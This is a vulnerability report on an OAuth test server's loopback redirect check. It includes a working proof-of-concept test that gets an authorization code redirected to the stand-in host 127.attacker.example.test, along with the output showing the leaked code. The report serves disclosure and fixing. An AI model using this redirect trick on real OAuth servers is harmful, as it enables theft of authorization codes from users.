# Tiny OAuth test server hostname prefixed with 127 receives authorization code

## Summary

`tiny-oauth-test-server` documents and enforces loopback HTTP redirect URIs for public OAuth clients, but its loopback validator accepts any four-label HTTP hostname whose first label parses as `127`. An authorization request with `redirect_uri=http://127.attacker.example.test/callback` is therefore approved and redirected with a live authorization code to a DNS hostname that is not a loopback IP address.

## Reproduction

Create the following disposable probe at `packages/tiny-oauth-test-server/src/__probe__.test.ts`:

```ts
import { createHash } from "node:crypto";
import http from "node:http";
import { describe, expect, it } from "vitest";
import { createOAuthTestServer } from "./index.js";

async function requestManually(url: URL): Promise<{ status: number; location: string }> {
  return new Promise((resolve, reject) => {
    const request = http.request(
      {
        method: "GET",
        hostname: url.hostname,
        port: Number(url.port),
        path: `${url.pathname}${url.search}`
      },
      (response) => {
        resolve({
          status: response.statusCode ?? 0,
          location: typeof response.headers.location === "string" ? response.headers.location : ""
        });
        response.resume();
      }
    );
    request.once("error", reject);
    request.end();
  });
}

describe("tiny OAuth hostname-shaped non-loopback redirect", () => {
  it("redirects an authorization code to an HTTP DNS hostname beginning with 127", async () => {
    const server = createOAuthTestServer({
      requireDcr: false,
      signingKeySeed: "hostname-loopback-probe",
      defaultAuthorization: { autoApprove: true }
    });
    const handle = await server.listen({ hostname: "127.0.0.1", port: 0 });

    try {
      const redirectUri = "http://127.attacker.example.test/callback";
      const verifier = "hostname-loopback-verifier-ABCDEFGHIJKLMNOPQRSTUVWXYZ";
      const authorizeUrl = new URL("/authorize", server.issuer);
      authorizeUrl.searchParams.set("response_type", "code");
      authorizeUrl.searchParams.set("client_id", "probe-client");
      authorizeUrl.searchParams.set("redirect_uri", redirectUri);
      authorizeUrl.searchParams.set(
        "code_challenge",
        createHash("sha256").update(verifier).digest("base64url")
      );
      authorizeUrl.searchParams.set("code_challenge_method", "S256");
      authorizeUrl.searchParams.set("resource", "https://resource.example.test/mcp");

      const response = await requestManually(authorizeUrl);
      console.log(JSON.stringify(response));

      expect(response.status).toBe(302);
      expect(response.location).toMatch(
        /^http:\/\/127\.attacker\.example\.test\/callback\?code=/
      );
    } finally {
      await handle.close();
    }
  });
});
```

Run the targeted probe and remove it afterward:

```sh
npm exec -- vitest run packages/tiny-oauth-test-server/src/__probe__.test.ts --reporter verbose
rm -f packages/tiny-oauth-test-server/src/__probe__.test.ts
```

The probe passes and prints a redirect carrying an authorization code to the non-loopback hostname:

```text
{"status":302,"location":"http://127.attacker.example.test/callback?code=...&iss=http%3A%2F%2F127.0.0.1%3A55049"}
✓ packages/tiny-oauth-test-server/src/__probe__.test.ts > tiny OAuth hostname-shaped non-loopback redirect > redirects an authorization code to an HTTP DNS hostname beginning with 127
```

## Observed Behavior

`isLoopbackRedirectUri()` splits the URL hostname on dots, requires only four labels, converts only the first label with `Number()`, and returns true when that value equals `127` at `packages/tiny-oauth-test-server/src/index.ts:181` through `packages/tiny-oauth-test-server/src/index.ts:200`. It never validates that the remaining labels are numeric IPv4 octets. Consequently `127.attacker.example.test` passes the loopback check.

During authorization, `handleAuthorize()` calls this validator before issuing a code at `packages/tiny-oauth-test-server/src/index.ts:1020` through `packages/tiny-oauth-test-server/src/index.ts:1094`. With `requireDcr: false` and automatic approval enabled, the server responds `302` with a `Location` beginning `http://127.attacker.example.test/callback?code=...`, delivering the code to a non-loopback DNS host.

## Expected Behavior

Loopback redirect validation should accept only actual loopback IP literals covered by the server contract, such as IPv4 addresses in `127.0.0.0/8` with numeric octets or IPv6 `::1`. A DNS hostname merely beginning with `127.` must be rejected with `invalid_request` and must never receive an authorization-code redirect.

## Impact

Tests using this fixture to enforce native-app loopback redirect security can silently accept a remote redirect URI and send a usable authorization code to an attacker-controlled hostname. This undermines negative tests for OAuth redirect validation and can make an integration appear compliant while it would leak codes outside the local callback listener.
